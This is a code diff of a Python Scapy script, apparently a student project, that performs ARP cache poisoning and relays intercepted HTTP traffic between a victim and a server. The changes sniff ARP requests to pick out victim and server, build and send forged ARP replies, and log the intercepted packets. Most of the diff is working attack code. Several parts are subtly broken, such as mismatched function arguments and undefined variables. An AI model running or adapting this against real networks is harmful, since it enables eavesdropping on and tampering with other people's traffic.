@@ -33,11 +33,6 @@ def network_scan(ip):
 # 2. We need to be able to get a current MAC adress. 
 # 3. we need to stop the attack in a proper way.
 
-# (1.) Start the poisoning attack by sending fake ARP replies.
-def poison(victim_ip, poison_ip, victim_mac):
-    attacker_mac = sc.get_if_hwaddr(sc.conf.iface)
-    fake_packet = sc.Ether(dst=victim_mac)/sc.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=poison_ip, hwsrc=attacker_mac)
-    sc.send(fake_packet, verbose=False)
 
 # (2.) Get the MAC adress of a given IP adress
 def get_mac(ip):
@@ -61,20 +56,75 @@ def stop_attack(victim_ip, real_ip, victim_mac, real_mac):
 def arp_poisoning(victim_ip, server_ip, mode):
     print("pre try", victim_ip, server_ip)
     try:
-        victim_mac = get_mac(victim_ip)
-        server_mac = get_mac(server_ip)
-        print("victim: ", victim_mac)
-        print("victimip: ", victim_ip)
-        print("server: ", server_mac)
-        print("serverip: ", server_ip)
+        victim_mac = ""
+        server_mac = ""
 
-        if mode == "silent":
-            poison(victim_ip, server_ip, victim_mac)
-            poison(server_ip, victim_ip, server_mac)
+        if (victim_ip is not None and server_ip is None):
+            victim_mac = get_mac(victim_ip)
+            pkt =  sc.sniff(filter="arp", iface="Intel(R) Wi-Fi 6 AX201 160MHz", store=0)
+            if pkt.haslayer(sc.ARP):
+                arp = pkt[sc.ARP]
+                if arp.op == 1 and arp.psrc == victim_ip:
+                    server_ip = arp.pdst
+                
+    
+        elif (victim_ip is None and server_ip is None):
+            pkt =  sc.sniff(filter="arp", store=0)
+            if pkt.haslayer(sc.ARP):
+                arp = pkt[sc.ARP]
+                if arp.op == 1:
+                    victim_ip = arp.psrc
+                    server_ip = arp.pdst
+                    victim_mac = get_mac(victim_ip)
+
         else:
+            print("else")
+            victim_mac = get_mac(victim_ip)
+            server_mac = get_mac(server_ip)
+            attacker_mac = sc.get_if_hwaddr(sc.conf.iface)
+            fake_packet_victim = sc.Ether(dst=victim_mac)/sc.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=server_ip, hwsrc=attacker_mac)
+            fake_packet_server = sc.Ether(dst=victim_mac)/sc.ARP(op=2, pdst=server_ip, hwdst=server_mac, psrc=victim_ip, hwsrc=attacker_mac)
+            if mode == "silent":
+                pkt =  sc.sniff(filter="arp", store=0)
+                if pkt.haslayer(sc.ARP):
+                    arp = pkt[sc.ARP]
+                    if arp.op == 1 and arp.psrc == victim_ip and arp.pdst == server_ip:
+                        sc.send(fake_packet_victim, verbose=False)
+                        sc.send(fake_packet_server, verbose=False)
+                        stop_attack(victim_ip, server_ip, victim_mac, server_mac)
+                        stop_attack(server_ip, victim_ip, server_mac, victim_mac)
+                    return server_mac, victim_mac
+            else: 
+                print("serverMac" + server_mac)
+                print("serverIP" + server_ip)  
+                print("clientMac" + victim_mac)
+                print("ClientIP" + victim_ip)       
+                print("sniffing")               
+                print("found pkt")
+                pkt =  sc.sniff(filter="arp", iface="Intel(R) Wi-Fi 6 AX201 160MHz", store=0, stop_filter=check_arp_server_client)
+                for i in range(5):  # run the loop 5 times
+                    print("sending")
+                    sc.send(fake_packet_server, verbose=False)
+                    print("i:", i)
+                    #time.sleep(2)
+                stop_attack(victim_ip, server_ip, victim_mac, server_mac)
+                stop_attack(server_ip, victim_ip, server_mac, victim_mac)
+                return server_mac, victim_mac
+            
+        if mode == "silent":
+            fake_packet_victim = sc.Ether(dst=victim_mac)/sc.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=server_ip, hwsrc=attacker_mac)
+            sc.send(fake_packet_victim, verbose=False)
+            server_mac = get_mac(server_ip)
+            fake_packet_server = sc.Ether(dst=victim_mac)/sc.ARP(op=2, pdst=server_ip, hwdst=server_mac, psrc=victim_ip, hwsrc=attacker_mac)
+            sc.send(fake_packet_server, verbose=False)
+        else:
+            fake_packet_victim = sc.Ether(dst=victim_mac)/sc.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=server_ip, hwsrc=attacker_mac)
+            sc.send(fake_packet_victim, verbose=False)
+            server_mac = get_mac(server_ip)
+            fake_packet_server = sc.Ether(dst=victim_mac)/sc.ARP(op=2, pdst=server_ip, hwdst=server_mac, psrc=victim_ip, hwsrc=attacker_mac)
             for i in range(5):  # run the loop 5 times
-                poison(victim_ip, server_ip, victim_mac)
-                poison(server_ip, victim_ip, server_mac)
+                sc.send(fake_packet_victim, verbose=False)
+                sc.send(fake_packet_server, verbose=False)
                 print("i:", i)
                 #time.sleep(2)
     except KeyboardInterrupt:
@@ -83,6 +133,15 @@ def arp_poisoning(victim_ip, server_ip, mode):
         stop_attack(victim_ip, server_ip, victim_mac, server_mac)
         stop_attack(server_ip, victim_ip, server_mac, victim_mac)
         return server_mac, victim_mac
+    
+
+
+def check_arp_server_client(pkt, server_ip, client_ip):
+    if pkt.haslayer(sc.ARP):
+        arp = pkt[sc.ARP]
+        if arp.op == 1 and arp.psrc == client_ip and arp.pdst == server_ip:
+            return True
+    return False
 
 
 ## Try to do de syn-ack response poging 5
@@ -188,6 +247,7 @@ def is_victim_ack(pkt, victimIP, attackerIP):
 def own_server(clientIP, serverIP, serverMac, attackerMac, attackerIP):
     while (True):
         nxt_pkt = sc.sniff(filter="http")
+        log_packet(nxt_pkt)
         if (nxt_pkt[sc.IP].src == clientIP):
             forward_to_server(nxt_pkt, attackerMac, attackerIP, serverMac, serverIP)
             if (is_rst(nxt_pkt) or is_tcp_fin(nxt_pkt)):
@@ -238,3 +298,7 @@ def forward_to_client(pkt, attackerMac, attackerIP, victimMac, victimIP):
     else:
         new_pkt = ether / ip / tcp
     sc.sendp(new_pkt, iface=sc.conf.iface, verbose=False)
+
+def log_packet(direction, pkt):
+    with open("packet_log.txt", "a") as log_file:
+        log_file.write(f"[{direction}] {pkt.summary()}\n")
